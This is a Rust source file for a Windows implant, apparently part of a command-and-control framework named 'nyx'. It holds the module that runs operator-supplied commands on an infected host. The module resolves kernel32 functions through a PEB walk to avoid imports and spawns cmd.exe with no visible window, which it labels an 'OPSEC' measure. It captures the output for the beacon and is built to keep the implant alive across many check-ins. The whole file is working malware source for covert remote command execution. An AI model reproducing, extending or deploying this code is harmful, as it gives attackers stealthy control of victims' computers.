//! Shell command execution via CreateProcessW with redirected stdout/stderr.
//!
//! Resolved through the PEB walk (no IAT). cmd.exe /C args; CREATE_NO_WINDOW
//! suppresses the console. The implant is `#![no_std]`, so it cannot use
//! `std::process::Command` — it shells out the way real position-independent
//! implants do: resolve the kernel32 process/pipe/file functions by djb2 hash,
//! build an anonymous pipe, point the child's stdout+stderr at the write end,
//! spawn `cmd.exe /C <args>`, and drain the read end until EOF.
//!
//! All Win32 functions come from `kernel32.dll` (always loaded in-process, so
//! no LoadLibrary is needed). The full 7-export table is resolved up front; if
//! any single export is missing the call fails fast with `Response::Err` rather
//! than transmuting a null pointer.

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use crate::resolve::export_addr;
use core::ffi::c_void;
use nyx_protocol::Response;

// ---- Win32 constants ----

/// STARTUPINFO.dwFlags bit: use hStdInput/hStdOutput/hStdError instead of the
/// console defaults. Without this, the handles we set below are ignored.
const STARTF_USESTDHANDLES: u32 = 0x100;
/// CREATE_NO_WINDOW: the child runs with no visible console. OPSEC rationale —
/// spawning cmd.exe would otherwise flash a conhost window to the user.
const CREATE_NO_WINDOW: u32 = 0x0800_0000;
/// WaitForSingleObject timeout for reaping the child process. Bounded (NOT
/// INFINITE) so a hung/long-running child (`ping -t`, a stuck binary) cannot
/// block the beacon forever — an INFINITE wait would permanently kill beacon
/// check-ins (P1-7). 30 s covers normal shell commands; on timeout we
/// TerminateProcess so the beacon survives and signals the operator.
const SHELL_TIMEOUT: u32 = 30_000;
/// WaitForSingleObject return value: the timeout elapsed without the handle
/// being signaled (the child did not exit in time).
const WAIT_TIMEOUT: u32 = 0x0000_0102;
/// SetHandleInformation dwMask / dwFlags value: the handle's inherit bit.
const HANDLE_FLAG_INHERIT: u32 = 0x0000_0001;
/// Upper bound on captured stdout. Prevents a runaway child (`ping -t`,
/// `yes`, a compile loop) from growing the output Vec unbounded and OOMing the
/// implant — a long-lived process that must survive many beacon cycles.
const MAX_OUTPUT: usize = 1 << 20; // 1 MiB

// ---- Win32 function pointer types (x64 "system" calling convention) ----

type CreateProcessW = unsafe extern "system" fn(
    lp_application_name: *const u16,
    lp_command_line: *mut u16,
    lp_process_attributes: *const SecurityAttributes,
    lp_thread_attributes: *const SecurityAttributes,
    b_inherit_handles: i32,
    dw_creation_flags: u32,
    lp_environment: *mut c_void,
    lp_current_directory: *const u16,
    lp_startup_info: *mut StartupInfoW,
    lp_process_information: *mut ProcessInformation,
) -> i32;

type CreatePipe = unsafe extern "system" fn(
    *mut *mut c_void,
    *mut *mut c_void,
    *const SecurityAttributes,
    u32,
) -> i32;

type ReadFile = unsafe extern "system" fn(
    h_file: *mut c_void,
    lp_buffer: *mut u8,
    n_number_of_bytes_to_read: u32,
    lp_number_of_bytes_read: *mut u32,
    lp_overlapped: *mut c_void,
) -> i32;

type WaitForSingleObject = unsafe extern "system" fn(*mut c_void, u32) -> u32;
type GetExitCodeProcess = unsafe extern "system" fn(*mut c_void, *mut u32) -> i32;
type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
type SetHandleInformation = unsafe extern "system" fn(*mut c_void, u32, u32) -> i32;

// ---- Win32 structs ----

#[repr(C)]
struct SecurityAttributes {
    n_length: u32,
    lp_security_descriptor: *mut c_void,
    b_inherit_handle: i32,
}

#[repr(C)]
struct StartupInfoW {
    cb: u32,
    lp_reserved: *const u16,
    lp_desktop: *const u16,
    lp_title: *const u16,
    dw_x: u32,
    dw_y: u32,
    dw_x_size: u32,
    dw_y_size: u32,
    dw_x_count_chars: u32,
    dw_y_count_chars: u32,
    dw_fill_attribute: u32,
    dw_flags: u32,
    w_show_window: u16,
    cb_reserved2: u16,
    lp_reserved2: *mut u8,
    h_std_input: *mut c_void,
    h_std_output: *mut c_void,
    h_std_error: *mut c_void,
}

#[repr(C)]
struct ProcessInformation {
    h_process: *mut c_void,
    h_thread: *mut c_void,
    dw_process_id: u32,
    dw_thread_id: u32,
}

/// Execute `cmd.exe /C <args>` and return combined stdout+stderr as
/// `Response::Output`. Any resolution/spawn failure becomes `Response::Err`.
///
/// The whole body is `unsafe` — PEB-walk resolution dereferences raw module
/// pointers, and every Win32 call here touches kernel handles.
pub fn run_shell(args: &str) -> Response {
    unsafe { run_shell_inner(args) }
}

unsafe fn run_shell_inner(args: &str) -> Response {
    // ---- resolve all 7 kernel32 exports up front ----
    // If any is missing, fail fast rather than transmute a null address.
    let create_process: CreateProcessW = match export_addr(b"kernel32.dll", b"CreateProcessW") {
        Some(a) => core::mem::transmute(a),
        None => return Response::Err(String::from("shell: CreateProcessW unresolved")),
    };
    let create_pipe: CreatePipe = match export_addr(b"kernel32.dll", b"CreatePipe") {
        Some(a) => core::mem::transmute(a),
        None => return Response::Err(String::from("shell: CreatePipe unresolved")),
    };
    let read_file: ReadFile = match export_addr(b"kernel32.dll", b"ReadFile") {
        Some(a) => core::mem::transmute(a),
        None => return Response::Err(String::from("shell: ReadFile unresolved")),
    };
    let wait_for_single: WaitForSingleObject =
        match export_addr(b"kernel32.dll", b"WaitForSingleObject") {
            Some(a) => core::mem::transmute(a),
            None => return Response::Err(String::from("shell: WaitForSingleObject unresolved")),
        };
    let _get_exit_code: GetExitCodeProcess =
        match export_addr(b"kernel32.dll", b"GetExitCodeProcess") {
            Some(a) => core::mem::transmute(a),
            None => return Response::Err(String::from("shell: GetExitCodeProcess unresolved")),
        };
    let close_handle: CloseHandle = match export_addr(b"kernel32.dll", b"CloseHandle") {
        Some(a) => core::mem::transmute(a),
        None => return Response::Err(String::from("shell: CloseHandle unresolved")),
    };
    let set_handle_info: SetHandleInformation =
        match export_addr(b"kernel32.dll", b"SetHandleInformation") {
            Some(a) => core::mem::transmute(a),
            None => return Response::Err(String::from("shell: SetHandleInformation unresolved")),
        };

    // ---- build the pipe: read end stays in the parent, write end goes to child ----
    // SECURITY_ATTRIBUTES.bInheritHandle = TRUE so the write handle is inherited
    // by the child; the read handle is then explicitly marked NON-inheritable
    // below, so only the child holds a write reference. That is what lets
    // ReadFile hit EOF once the child exits and closes its write end.
    let sa = SecurityAttributes {
        n_length: core::mem::size_of::<SecurityAttributes>() as u32,
        lp_security_descriptor: core::ptr::null_mut(),
        b_inherit_handle: 1,
    };
    let mut child_std_out_read: *mut c_void = core::ptr::null_mut();
    let mut child_std_out_write: *mut c_void = core::ptr::null_mut();
    if create_pipe(&mut child_std_out_read, &mut child_std_out_write, &sa, 0) == 0 {
        // CreatePipe failed — nothing opened yet, nothing to clean up.
        return Response::Err(String::from("shell: CreatePipe failed"));
    }
    // Mark the READ end non-inheritable. The write end is still inheritable
    // (from sa), which is what CreateProcessW will duplicate into the child.
    set_handle_info(child_std_out_read, HANDLE_FLAG_INHERIT, 0);

    // ---- startup info: redirect stdout + stderr to the pipe write end ----
    let mut si: StartupInfoW = core::mem::zeroed();
    si.cb = core::mem::size_of::<StartupInfoW>() as u32;
    // STARTF_USESTDHANDLES tells CreateProcessW to use the hStd* handles below
    // instead of the console. Without this bit the handles are ignored.
    si.dw_flags = STARTF_USESTDHANDLES;
    si.h_std_output = child_std_out_write;
    si.h_std_error = child_std_out_write; // combine stderr into the same stream
    si.h_std_input = core::ptr::null_mut(); // no stdin; cmd /C rarely needs it

    // ---- command line ----
    // CreateProcessW may modify lpCommandLine in place (it re-parses the args),
    // so it must be a WRITABLE buffer. transport.rs's to_utf16 returns an
    // immutable Vec<u16>; we build our own so we can hand off a *mut u16.
    let mut cmdline: Vec<u16> = Vec::with_capacity(9 + args.len() + 1);
    // The "cmd.exe /C " prefix is pure ASCII — widen each byte directly.
    cmdline.extend(b"cmd.exe /C ".iter().map(|&b| b as u16));
    // The operator's args may contain non-ASCII (filenames), so widen those
    // through str::encode_utf16 (a core method, available under no_std).
    cmdline.extend(args.encode_utf16());
    cmdline.push(0); // NUL terminator

    let mut pi: ProcessInformation = core::mem::zeroed();
    // lpApplicationName = NULL (cmd.exe resolved via lpCommandLine + PATH).
    // bInheritHandles = TRUE so the write end of the pipe is inherited.
    // dwCreationFlags includes CREATE_NO_WINDOW — no conhost flash (OPSEC).
    let ok = create_process(
        core::ptr::null(),
        cmdline.as_mut_ptr(),
        core::ptr::null(),
        core::ptr::null(),
        1,
        CREATE_NO_WINDOW,
        core::ptr::null_mut(),
        core::ptr::null(),
        &mut si,
        &mut pi,
    );
    if ok == 0 {
        // CreateProcessW failed. Close BOTH pipe ends we opened — the implant
        // is long-lived and a handle leak per failed shell would exhaust the
        // table over thousands of cycles.
        close_handle(child_std_out_read);
        close_handle(child_std_out_write);
        return Response::Err(String::from("shell: CreateProcessW failed"));
    }

    // Close OUR copy of the write end NOW. The child has its own (inherited)
    // reference, so this does not break it. It does ensure that once the child
    // finishes and closes its write handle, there are no remaining writers and
    // ReadFile returns 0 (EOF) — without this, ReadFile would block forever
    // because the parent still holds a write reference to the pipe.
    close_handle(child_std_out_write);

    // ---- drain stdout+stderr ----
    let mut out: Vec<u8> = Vec::new();
    let mut buf = [0u8; 4096];
    let mut capped = false; // true once MAX_OUTPUT is reached
    loop {
        if out.len() >= MAX_OUTPUT {
            // Hard cap reached — stop appending. We flag `capped` so the wait
            // below TERMINATES the child instead of blocking forever: a child
            // still producing into a full pipe (~64 KiB kernel buffer) would
            // block on its next WriteFile, while WaitForSingleObject(INFINITE)
            // blocks on the child exiting → classic deadlock. Killing the
            // child unblocks both sides.
            capped = true;
            break;
        }
        let mut read: u32 = 0;
        // ReadFile returns 0 on error OR on EOF. We distinguish by checking
        // bytes_read: >0 is data, ==0 (after a "successful" 0-length read or
        // an error read) means EOF/pipe-closed — break.
        let ok = read_file(
            child_std_out_read,
            buf.as_mut_ptr(),
            buf.len() as u32,
            &mut read,
            core::ptr::null_mut(),
        );
        if read == 0 {
            break;
        }
        // Defense-in-depth: never append more than what was read, and never
        // overshoot the cap on the final chunk.
        let take = (read as usize).min(MAX_OUTPUT - out.len());
        out.extend_from_slice(&buf[..take]);
        if ok == 0 {
            // ReadFile reported an error after yielding some bytes — we have
            // what we got; stop.
            break;
        }
    }

    // ---- reap the child and clean up every handle ----
    // If we stopped reading because MAX_OUTPUT was hit, the child may still be
    // alive and blocked writing into the (full) pipe. WaitForSingleObject(INFINITE)
    // would then deadlock (parent waits for child exit, child waits for parent to
    // drain). Terminate the child first so the wait always completes.
    if capped {
        type TerminateProcess = unsafe extern "system" fn(*mut c_void, u32) -> i32;
        if let Some(addr) = export_addr(b"kernel32.dll", b"TerminateProcess") {
            let term: TerminateProcess = core::mem::transmute(addr);
            let _ = term(pi.h_process, 1);
        }
    }
    // Bounded reap: wait up to SHELL_TIMEOUT for the child to exit. If the
    // `capped` branch above already TerminateProcess'd it, this returns at
    // once (the handle is signaled on exit). On WAIT_TIMEOUT the child is
    // still alive (hung/long-running) — kill it so the beacon survives and
    // signal the forced termination to the operator.
    let wait_result = wait_for_single(pi.h_process, SHELL_TIMEOUT);
    if wait_result == WAIT_TIMEOUT {
        type TerminateProcess = unsafe extern "system" fn(*mut c_void, u32) -> i32;
        if let Some(addr) = export_addr(b"kernel32.dll", b"TerminateProcess") {
            let term: TerminateProcess = core::mem::transmute(addr);
            let _ = term(pi.h_process, 1);
        }
        out.extend_from_slice(b"\n<nyx: shell command timed out and was killed>\n");
    }
    // Best-effort exit-code harvest (unused today — Response has no exit-code
    // variant), but it documents the resolved GetExitCodeProcess export is live.
    let mut exit_code: u32 = 0;
    let _ = _get_exit_code(pi.h_process, &mut exit_code);

    // Close process + thread handles (CreateProcessW opened both) and the read
    // end of the pipe. All three must be closed to avoid leaking handles.
    close_handle(pi.h_process);
    close_handle(pi.h_thread);
    close_handle(child_std_out_read);

    Response::Output(out)
}
